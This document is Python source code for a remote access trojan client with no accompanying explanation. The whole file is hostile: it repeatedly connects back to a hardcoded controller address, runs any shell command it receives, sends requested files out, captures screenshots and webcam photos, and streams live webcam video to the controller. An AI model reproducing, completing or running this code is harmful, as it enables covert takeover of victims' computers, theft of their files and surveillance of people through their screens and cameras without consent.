import socket, os, sys, subprocess, cv2
from PIL import ImageGrab
import pickle, struct
HOST, PORT = "192.168.2.107", 444
agent = socket.socket()
while 1:
    try:
        agent.connect((HOST, PORT))
        break
    except:
        continue
#send webcam stream to server
def webcam():
    host, port = "192.168.2.107", 4444
    client = socket.socket()
    client.connect((host, port))
    cam = cv2.VideoCapture(0)
    cam.set(3, 320)
    cam.set(4, 240)
    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
    while True:
        ret, frame = cam.read()
        result, frame = cv2.imencode('.jpg', frame, encode_param)
        data = pickle.dumps(frame, 0)
        size = len(data)
        client.sendall(struct.pack(">L", size)+data)
        signal = client.recv(1024)
        if str.encode("DONE") in signal:
            break
    cam.release()
    client.close()

#send camera selfie to server
def selfie(conn):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    cv2.imwrite("image.jpg", frame)
    cam.release()
    file = open("image.jpg", 'rb')
    bits = file.read(1024)
    for bit in bits:
        conn.send(bits)
        bits = file.read(1024)
    file.close()
    conn.send(str.encode("DONE"))
    os.remove("image.jpg")
#Function to transfer file
def transfer(filename, conn):
    try:
        file = open(filename, 'rb')
        bits = file.read(1024)
        for bit in bits:
            conn.send(bits)
            bits = file.read(1024)
        file.close()
        conn.send(str.encode("DONE"))
    except FileNotFoundError:
        conn.send(str.encode("DONE"))
#function to transfer screenshot
def screenshot(conn):
    shotname = "shot.jpg"
    ImageGrab.grab().save(shotname, "JPEG")
    file = open(shotname, 'rb')
    bits = file.read(1024)
    for bit in bits:
        conn.send(bits)
        bits = file.read(1024)
    file.close()
    conn.send(str.encode("DONE"))
    os.remove(shotname)
while True:
    command = agent.recv(2048)
    if command.decode('utf-8') == "terminate":
        agent.close()
        sys.exit()
    if command[:3].decode('utf-8') == "cd ":
        try:
            os.chdir(command[3:])
            path = os.getcwd()
            agent.send(str.encode(path))
            continue
        except FileNotFoundError:
            agent.send(str.encode("[-] Incorrect Directory!"))
            continue
    if command[:9].decode('utf-8') == "download ":
        transfer(command[9:].decode('utf-8'), agent)
        continue
    if command.decode('utf-8') == "screenshot":
        screenshot(agent)
        continue
    if command.decode('utf-8') == "campic":
        selfie(agent)
        continue
    if command.decode('utf-8') == "webcam":
        webcam()
        continue
    if len(command) > 0:
        result = subprocess.getoutput(command.decode('utf-8'))
        agent.send(str.encode(result))